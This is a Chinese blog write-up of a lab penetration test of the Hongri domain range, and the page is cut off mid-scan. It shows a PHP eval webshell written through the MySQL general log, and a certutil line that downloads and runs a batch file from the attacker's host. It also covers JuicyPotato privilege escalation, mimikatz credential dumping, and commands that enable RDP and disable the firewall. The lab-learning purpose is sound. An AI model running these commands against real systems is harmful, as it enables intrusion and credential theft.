@@ -1,0 +1,1331 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="红日靶场 1, marin的小窝">
+    <meta name="description" content="红日靶场 1靶场搭建这里下载了有三个文件，需要搭建三台机子
+
+win7
+
+
+win2008
+
+
+win2003
+
+
+kali
+
+
+
+然后修改虚拟网络配置，将 vmnet1 修改为 52 网段
+
+然后打开几个机子，都会是 52 网段
+
+
+wi">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>红日靶场 1 | marin的小窝</title>
+    <link rel="icon" type="image/jpeg" href="/favicon.jpg">
+    
+
+
+    <!-- bg-cover style     -->
+
+
+
+<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+<link rel="stylesheet" type="text/css" href="/css/matery.css">
+<link rel="stylesheet" type="text/css" href="/css/my.css">
+<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">
+
+
+
+
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+    <link rel="stylesheet" href="/css/post.css">
+
+
+
+
+    
+        <link rel="stylesheet" type="text/css" href="/css/reward.css">
+    
+
+
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">marin的小窝</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>主页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>类型</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于我</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友链</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+  <li>
+    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
+      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">marin的小窝</div>
+        <div class="logo-desc">
+            
+            一个学习网安的小菜鸡
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			主页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			类型
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于我
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友链
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/76dty8y5jpmit0o32n6a4dpr3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">红日靶场 1</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                                <span class="chip bg-color">内网渗透</span>
+                            </a>
+                        
+                            <a href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/">
+                                <span class="chip bg-color">红日靶场系列</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                渗透
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2026-03-17
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="红日靶场-1"><a href="#红日靶场-1" class="headerlink" title="红日靶场 1"></a>红日靶场 1</h1><h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>这里下载了有三个文件，需要搭建三台机子</p>
+<ul>
+<li><p>win7</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310200501-c1lj0ny.png" alt="image"></p>
+</li>
+<li><p>win2008</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310200556-jvu53y8.png" alt="image"></p>
+</li>
+<li><p>win2003</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310200621-a7pfgnj.png" alt="image"></p>
+</li>
+<li><p>kali</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310200648-js2308b.png" alt="image"></p>
+</li>
+</ul>
+<p>然后修改虚拟网络配置，将 vmnet1 修改为 52 网段</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310200917-owc7ax3.png" alt="image"></p>
+<p>然后打开几个机子，都会是 52 网段</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310201438-26xfmqq.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310201537-dai5ndv.png" alt="image"></p>
+<p>win7 有两个不同网段的 ip 一个是外网的，一个是内网的</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310201634-5wzkyz7.png" alt="image"></p>
+<p>然后在 win7 中启动 phpstudy</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310203948-dt56rzp.png" alt="image"></p>
+<p>访问 <code>127.0.0.1</code> 成功启动</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310204039-64gfqtf.png" alt="image"></p>
+<p>本机也能访问</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310204216-0os7eso.png" alt="image"></p>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>先在这个页面浏览一下有什么内容，可以看到一堆版本信息</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310204813-w4fuf2j.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310204805-a8apm6y.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310204348-wyo5cxz.png" alt="image"></p>
+<p>这里还有一个 MySQL 数据库连接测试，使用弱密码 root:root 尝试一下，果然是弱密码（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310204434-a61xvoc.png" alt="image"></p>
+<p><code>phpinfo.php</code></p>
+<p>这里可以收集到当前的目录</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310210743-uer0dc5.png" alt="image"></p>
+<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>扫描一下目录，扫到一大堆东西，这里感觉御剑扫的全一点</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310210844-ovd7of5.png" alt="image"></p>
+<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.154.131</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311202526-jip2e89.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<h3 id="phpmyadmin-渗透"><a href="#phpmyadmin-渗透" class="headerlink" title="phpmyadmin 渗透"></a>phpmyadmin 渗透</h3><p>发现没有访问限制，并且是弱密码，使用 root:root 成功登录</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310205314-v9t5pb6.png" alt="image"></p>
+<p>这里是一个 sql 管理平台，这里的 sql 页面可以执行 sql 语句</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310210032-yik6tcd.png" alt="image"></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">select @@secure_file_priv</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310210143-tu3vcct.png" alt="image"></p>
+<p>这里其实都可以用 sqlmap getshell 了，因为这里是 root 权限并且 <code>secure_file_priv</code> 配置为空</p>
+<p>这里先尝试手动写 shell 到前端，参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/liliyuanshangcao/p/13815242.html">PhpMyAdmin漏洞利用汇总 - 只言 - 博客园</a></p>
+<p>先查看当前日志目录</p>
+<pre class="line-numbers language-sql" data-language="sql" data-start="1"><code class="language-sql">show variables like &#39;general%&#39;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310210504-2kfx4uu.png" alt="image"></p>
+<p>这里功能关闭了，要打开</p>
+<pre class="line-numbers language-sql" data-language="sql" data-start="1"><code class="language-sql">set global general_log &#x3D; &quot;ON&quot;</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310210620-u4yrvc8.png" alt="image"></p>
+<p>然后修改这个日志的路径，这里写到前面信息收集得到的目录中</p>
+<pre class="line-numbers language-sql" data-language="sql" data-start="1"><code class="language-sql">set global general_log_file &#x3D; &quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;shell.php&quot;</code></pre>
+
+<p>然后写入执行代码</p>
+<pre class="line-numbers language-sql" data-language="sql" data-start="1"><code class="language-sql">select &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;;</code></pre>
+
+<p>成功 getshell 了，接下来就可以用蚁剑连接了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310211116-k3d1elc.png" alt="image"></p>
+<p>这里可以看这个 yxcms 的存在，其实刚才也扫出来了这个备份文件</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310211433-ocgqoln.png" alt="image"></p>
+<h3 id="yxcms-渗透"><a href="#yxcms-渗透" class="headerlink" title="yxcms 渗透"></a>yxcms 渗透</h3><p>上面其实已经完成了，这里是另一个攻击点</p>
+<p>这里公告就全泄露了，但是这个后台我死都进不去，一直显示验证码错误，不知道为什么，这个网站的验证码我都过不了，所以这里渗透卡住了（</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311165035-t4gnm5f.png" alt="image"></p>
+<blockquote>
+<p>这里应该是有一个 XSS 和文件上传的漏洞</p>
+</blockquote>
+<p>‍</p>
+<h3 id="内网上线"><a href="#内网上线" class="headerlink" title="内网上线"></a>内网上线</h3><h4 id="vshell"><a href="#vshell" class="headerlink" title="vshell"></a>vshell</h4><p>这里先尝试 vshell 来进入内网，因为服务器 php 禁止了一些函数，会导致一些命令无法执行</p>
+<p>这里先新建一个监听，地址都用我们 kali 的地址</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310213102-006fytj.png" alt="image"></p>
+<p>然后目标服务器执行上线命令</p>
+<pre class="line-numbers language-sql" data-language="sql" data-start="1"><code class="language-sql">certutil.exe -urlcache -split -f http:&#x2F;&#x2F;192.168.154.130:8000&#x2F;swt C:\Users\Public\run.bat &amp;&amp; C:\Users\Public\run.bat</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310213252-qb002s6.png" alt="image"></p>
+<p>成功添加客户端</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310213300-j6ozghr.png" alt="image"></p>
+<p>这里需要提权，否则 vshell 的插件不能执行</p>
+<p>这里先看系统版本和补丁，这里没有很多补丁，应该可以打很多 CVE</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">systeminfo</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310214238-mko50s1.png" alt="image"></p>
+<p>查看特权，这里有 <code>SeImpersonatePrivilege</code>​ 可以利用土豆家族提权  <a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato/releases">Releases · ohpe&#x2F;juicy-potato</a></p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">whoami &#x2F;priv</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310214912-hkzh4sd.png" alt="image"></p>
+<p>上传土豆和 vshell 生成的 exe 文件，成功提权</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">C:\Windows\Temp\JuicyPotato.exe -t t -p &quot;C:\Windows\Temp\tcp_windows_amd64.exe&quot; -l 1337</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310215806-ru1nh99.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260310220030-yz0l7za.png" alt="image"></p>
+<p>提权之后就可以使用插件了</p>
+<p>这里可以直接用 mimikatz 获取密码</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311164623-pj660ar.png" alt="image"></p>
+<p>‍</p>
+<p>‍</p>
+<h4 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h4><p>先创建一个监听先</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311162155-4qxjbwx.png" alt="image"></p>
+<p>然后生成一个攻击程序</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311162212-gc78y8k.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311162247-pfbr9yo.png" alt="image"></p>
+<p>使用蚁剑上传</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311162322-edp9t8d.png" alt="image"></p>
+<p>执行后就上线了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311162501-jwlzck5.png" alt="image"></p>
+<p>这个 cs 的命令有点麻烦，需要在前面加一个 shell，而且不是秒回显的，需要等等，可以使用这个命令来修改这个限制，但是真实环境中使用这个命令会提升被目标检测到的风险</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">sleep 0
+shell whoami</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311163613-bxbfrpu.png" alt="image"></p>
+<p>cs 方便的就是可以直接提权</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311163847-fie4bbb.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311164021-0xxfxgr.png" alt="image"></p>
+<p>这里应该是可以直接使用插件的命令，这里的抓取明文密码就是使用的 mimikatz 的 <code>logonpasswords</code> 命令</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311164207-b3k7nmx.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311164238-m10rkej.png" alt="image"></p>
+<p>在密码凭证这里就可以看到密码了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311164258-r3b4v0h.png" alt="image"></p>
+<h3 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h3><h4 id="密码凭证"><a href="#密码凭证" class="headerlink" title="密码凭证"></a>密码凭证</h4><p>前面都获取了用户密码就是 admin@123</p>
+<h4 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h4><p>查询远程桌面 3389 端口有没有开启</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">netstat -ano|findstr 3389</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311175750-wv112xx.png" alt="image"></p>
+<p>没有输出，说明没有开启，使用命令开启</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</code></pre>
+
+<p>但是远程桌面还是没有连接上，有可能是防火墙的原因</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">netsh advfirewall show allprofiles</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311180525-zfi0kix.png" alt="image"></p>
+<p>这里进入被限制了，使用这个命令关闭</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">netsh advfirewall set allprofiles state off</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311180611-cc9mes5.png" alt="image"></p>
+<p>这里的用户名需要加上这个域名</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311180734-9rjgclu.png" alt="image"></p>
+<p>看看 ip 信息可以发现除了 <code>192.168.154.0/24</code>​ 这个网段，还有一个 <code>192.168.52.143</code> 的 ip，这个很可能是内网</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311181215-dre85u2.png" alt="image"></p>
+<h4 id="内网主机扫描"><a href="#内网主机扫描" class="headerlink" title="内网主机扫描"></a>内网主机扫描</h4><p>这里使用 nmap 扫描内网 IP，这里不知道为什么远程桌面使用 nmap 扫不到，但是用 vshell 的控制台就可以扫描</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -sn -PR -n 192.168.52.143&#x2F;24</code></pre>
+
+<p>可以看到内网除了 <code>192.168.52.1</code>​、<code>192.168.52.2</code>​、<code>192.168.52.154</code>​ 这三个虚拟网关地址之外，还有 <code>192.168.52.138</code>​、<code>192.168.52.141</code> 这两个主机</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311182924-dru8sa0.png" alt="image"></p>
+<h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><p>这里已经确定了这个域名为 <code>god</code>，锁定了目标之后需要寻找出哪个 IP 是域控机器</p>
+<p>确定域信息</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">net config workstation</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311183542-35tb9rx.png" alt="image"></p>
+<p>确定了内网架构，这里是 <code>STU1</code>​ 就是被控制的机器，<code>OWA</code> 是域控，另一个目标就是域内的另一台服务器</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">net view</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311183713-8wt6wmo.png" alt="image"></p>
+<p>这里看文章发现这个命令在 CS 中可以获取更多信息，但是不知道为什么和文章不一样，这里获取的 IP 不是对应的域内 ip，应该是配置的问题</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311184239-qa3z1og.png" alt="image"></p>
+<p>这里 CS 应该也是用这两个命令去探测的信息，这里可能是配置出问题了</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">ping -n 1 OWA
+ping -n 1 ROOT-TVI862UBEH</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311184641-plnix3c.png" alt="image"></p>
+<p>然后学到另一个方法，使用 <code>nbtstat</code>，这个就能对应上 IP 的身份了</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nbtstat -A 192.168.52.138
+nbtstat -A 192.168.52.141</code></pre>
+
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311184722-la67pr9.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20260311184730-pcnxk9o.png" alt="image"></p>
+<p>对这两个服务进行端口扫描，看看有没有什么服务开放</p>
+<p>域控信息，这里有一个 <code>IIS</code> 的服务</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.138
+
+Nmap scan report for 192.168.52.138
+Host is up (0.012s latency).
+Not shown: 65516 filtered ports
+PORT      STATE SERVICE      VERSION
+53&#x2F;tcp    open  domain       Microsoft DNS 6.1.7601 (1DB1446A) (Windows Server 2008 R2 SP1)
+| dns-nsid:
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB1446A)
+80&#x2F;tcp    open  http         Microsoft IIS httpd 7.5
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS&#x2F;7.5
+|_http-title: IIS7
+88&#x2F;tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-03-11 10:54:02Z)
+135&#x2F;tcp   open  msrpc        Microsoft Windows RPC
+139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389&#x2F;tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: god.org, Site: Default-First-Site-Name)
+445&#x2F;tcp   open  microsoft-ds Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: GOD)
+464&#x2F;tcp   open  kpasswd5?
+593&#x2F;tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636&#x2F;tcp   open  tcpwrapped
+3268&#x2F;tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: god.org, Site: Default-First-Site-Name)
+3269&#x2F;tcp  open  tcpwrapped
+9389&#x2F;tcp  open  mc-nmf       .NET Message Framing
+49154&#x2F;tcp open  msrpc        Microsoft Windows RPC
+49155&#x2F;tcp open  msrpc        Microsoft Windows RPC
+49157&#x2F;tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49158&#x2F;tcp open  msrpc        Microsoft Windows RPC
+49161&#x2F;tcp open  msrpc        Microsoft Windows RPC
+49167&#x2F;tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:EE:4B:E0 (VMware)
+Service Info: Host: OWA; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows_server_2008:r2:sp1, cpe:&#x2F;o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -2h40m00s, deviation: 4h37m05s, median: -1s
+|_nbstat: NetBIOS name: OWA, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:ee:4b:e0 (VMware)
+| smb-os-discovery:
+|   OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1 (Windows Server 2008 R2 Datacenter 6.1)
+|   OS CPE: cpe:&#x2F;o:microsoft:windows_server_2008::sp1
+|   Computer name: owa
+|   NetBIOS computer name: OWA\x00
+|   Domain name: god.org
+|   Forest name: god.org
+|   FQDN: owa.god.org
+|_  System time: 2026-03-11T18:54:53+08:00
+| smb-security-mode:
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2026-03-11T10:54:53
+|_  start_date: 2026-03-11T08:13:56
+
+Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 293.44 seconds</code></pre>
+
+<p>这个是另一台服务</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.141
+
+Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2026-03-11 18:56 ?D1ú±ê×?ê±??
+Nmap scan report for 192.168.52.141
+Host is up (0.000027s latency).
+Not shown: 65521 closed ports
+PORT     STATE SERVICE         VERSION
+21&#x2F;tcp   open  ftp             Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|_  SYST: Windows_NT
+135&#x2F;tcp  open  msrpc           Microsoft Windows RPC
+139&#x2F;tcp  open  netbios-ssn     Microsoft Windows netbios-ssn
+445&#x2F;tcp  open  microsoft-ds    Windows Server 2003 3790 microsoft-ds
+777&#x2F;tcp  open  multiling-http?
+1025&#x2F;tcp open  msrpc           Microsoft Windows RPC
+1040&#x2F;tcp open  msrpc           Microsoft Windows RPC
+1041&#x2F;tcp open  msrpc           Microsoft Windows RPC
+1043&#x2F;tcp open  msrpc           Microsoft Windows RPC
+6002&#x2F;tcp open  http            SafeNet Sentinel Protection Server 7.3
+|_http-server-header: SentinelProtectionServer&#x2F;7.3
+|_http-title: Sentinel License Monitor
+7001&#x2F;tcp open  afs3-callback?
+7002&#x2F;tcp open  http            SafeNet Sentinel Keys License Monitor httpd 1.0 (Java Console)
+|_http-server-header: SentinelKeysServer&#x2F;1.0
+|_http-title: Sentinel Keys License Monitor
+8098&#x2F;tcp open  ssl&#x2F;http        Microsoft IIS httpd 6.0
+| http-auth:
+| HTTP&#x2F;1.1 401 Unauthorized\x0D
+|_  Basic realm&#x3D;192.168.52.141
+|_http-server-header: Microsoft-IIS&#x2F;6.0
